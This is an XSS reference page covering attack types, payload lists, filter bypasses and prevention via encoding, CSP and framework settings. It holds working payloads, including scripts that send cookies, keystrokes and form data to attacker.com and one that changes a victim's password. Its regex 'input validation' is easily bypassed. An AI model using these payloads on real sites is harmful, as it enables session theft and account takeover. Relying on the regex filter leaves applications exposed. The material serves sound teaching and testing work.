# Cross-Site Scripting (XSS)

> Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web applications viewed by other users. XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping, enabling attackers to execute scripts in the victim's browser.

## Summary

* [Types of XSS](#types-of-xss)
* [XSS Payloads](#xss-payloads)
* [DOM-based XSS](#dom-based-xss)
* [Stored XSS](#stored-xss)
* [Reflected XSS](#reflected-xss)
* [XSS Prevention](#xss-prevention)
* [Content Security Policy (CSP)](#content-security-policy-csp)
* [XSS Testing Tools](#xss-testing-tools)
* [XSS in Modern Frameworks](#xss-in-modern-frameworks)
* [References](#references)

## Types of XSS

### 1. Stored XSS (Persistent XSS)
Malicious script is permanently stored on the target server (database, message forum, comment field) and executed when users retrieve the stored data.

**Example:**
```html
<!-- Malicious comment stored in database -->
<script>alert('XSS')</script>
```

### 2. Reflected XSS (Non-Persistent XSS)
Malicious script is reflected off a web server, typically via URL parameters or form submissions, and executed immediately.

**Example:**
```html
<!-- URL: https://example.com/search?q=<script>alert('XSS')</script> -->
<div>Search results for: <script>alert('XSS')</script></div>
```

### 3. DOM-based XSS
Vulnerability exists in client-side code rather than server-side code. The attack payload is executed as a result of modifying the DOM environment.

**Example:**
```javascript
// Vulnerable JavaScript
document.write(document.location.href.substring(document.location.href.indexOf("default=")+8));
```

## XSS Payloads

### Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Advanced Payloads
```html
<!-- Bypass filters -->
<iframe src="javascript:alert('XSS')">
<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

<!-- Event handlers -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<button onclick=alert('XSS')>Click me</button>

<!-- SVG payloads -->
<svg><script>alert('XSS')</script></svg>
<svg/onload=alert('XSS')>
```

### Data Exfiltration Payloads
```javascript
// Steal cookies
<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie</script>

// Keylogger
<script>
document.addEventListener('keydown', function(e) {
    new Image().src = 'http://attacker.com/log.php?key=' + e.key;
});
</script>

// Form hijacking
<script>
document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(Object.fromEntries(new FormData(e.target)))
    });
});
</script>
```

## DOM-based XSS

### Sources (Input Points)
```javascript
document.URL
document.location
document.referrer
window.name
location.hash
location.search
```

### Sinks (Output Points)
```javascript
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout()
setInterval()
```

### Example Vulnerability
```javascript
// Vulnerable code
function displayUserName() {
    var name = document.location.hash.substring(1);
    document.getElementById('username').innerHTML = name;
}

// Safe version
function displayUserNameSafe() {
    var name = document.location.hash.substring(1);
    document.getElementById('username').textContent = name;
}
```

## Stored XSS

### Common Injection Points
- User profiles
- Comments/forum posts
- File uploads (metadata)
- Chat messages
- Product reviews

### Example Attack
```html
<!-- Malicious profile bio -->
<script>
fetch('/api/change-password', {
    method: 'POST',
    body: JSON.stringify({password: 'hacked123'})
});
</script>
```

## Reflected XSS

### Common Vectors
- URL parameters
- Form inputs
- HTTP headers
- Error messages

### Example Attack
```html
<!-- URL: https://example.com/greeting?name=<script>alert('XSS')</script> -->
<h1>Hello, <script>alert('XSS')</script>!</h1>
```

## XSS Prevention

### 1. Input Validation
```python
# Python example
import re

def validate_input(user_input):
    # Remove script tags
    cleaned = re.sub(r'<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>', '', user_input, flags=re.IGNORECASE)
    # Remove event handlers
    cleaned = re.sub(r'on\w+\s*=\s*["\']?[^"\']*["\']?', '', cleaned, flags=re.IGNORECASE)
    return cleaned
```

### 2. Output Encoding
```python
# HTML encoding
import html

def escape_html(text):
    return html.escape(text, quote=True)

# JavaScript encoding
import json

def escape_js(text):
    return json.dumps(text)
```

### 3. Context-Specific Encoding
```html
<!-- HTML context -->
<div>{{ user_input|e }}</div>

<!-- JavaScript context -->
<script>
var userData = {{ user_input|tojson|safe }};
</script>

<!-- URL context -->
<a href="{{ url_for('profile', username=user_input|urlencode) }}">Profile</a>
```

### 4. Template Engine Security
```python
# Jinja2 (Flask)
from markupsafe import Markup

# Safe - auto-escaping enabled
{{ user_input }}

# Unsafe - manual escaping required
{{ user_input|safe }}

# Django templates
{{ user_input }}  # Auto-escaped
{{ user_input|safe }}  # Manual override
```

## Content Security Policy (CSP)

### Basic CSP Header
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
```

### Strict CSP
```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self';
```

### CSP with Nonce
```
Content-Security-Policy: script-src 'nonce-2726c7f26c';
```
```html
<script nonce="2726c7f26c">
    // This script will execute
</script>
```

## XSS Testing Tools

### Automated Tools
- **XSStrike** - Advanced XSS detection
- **XSS Hunter** - Blind XSS detection
- **Burp Suite** - Web vulnerability scanner
- **OWASP ZAP** - Open-source web scanner

### Manual Testing
```javascript
// Basic test strings
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Polyglot payloads
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## XSS in Modern Frameworks

### React
```javascript
// Safe - React escapes by default
<div>{userInput}</div>

// Unsafe - dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Safe usage
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />
```

### Vue.js
```javascript
// Safe - Vue escapes by default
<div>{{ userInput }}</div>

// Unsafe - v-html directive
<div v-html="userInput"></div>

// Safe usage
<div v-html="DOMPurify.sanitize(userInput)"></div>
```

### Angular
```typescript
// Safe - Angular sanitizes by default
<div>{{ userInput }}</div>

// Unsafe - bypassSecurityTrustHtml
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userInput)"></div>

// Safe usage
<div [innerHTML]="sanitizer.sanitize(SecurityContext.HTML, userInput)"></div>
```

## References

* [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
* [XSS Payloads](https://github.com/payloadbox/xss-payloads-list)
* [DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
